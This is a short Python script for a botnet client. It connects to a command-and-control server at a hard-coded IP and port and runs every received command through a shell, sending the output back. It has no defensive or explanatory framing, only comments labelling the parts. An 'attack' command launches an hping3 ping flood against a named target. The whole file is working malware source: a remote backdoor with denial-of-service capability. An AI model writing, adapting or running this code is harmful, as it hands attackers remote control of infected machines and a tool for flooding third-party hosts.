import socket
import subprocess

# Connection to server C&C
bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bot_socket.connect(("244.178.44.111", 8080))

while True:
    # Waiting for a command
    command = bot_socket.recv(1024).decode().strip()

    if command.lower() == 'exit':
        # Close the connection
        bot_socket.close()
        break
    elif command.lower().startswith('attack'):
        # Extract the target from the command
        _, target = command.split()

        # Perform a ping flood attack using hping3
        attack_command = f"hping3 -1 --flood -c 1000 {target}"
        subprocess.Popen(attack_command, shell=True)
    else:
        # Execute the command
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()

        # Send the output back to the server
        bot_socket.sendall(output)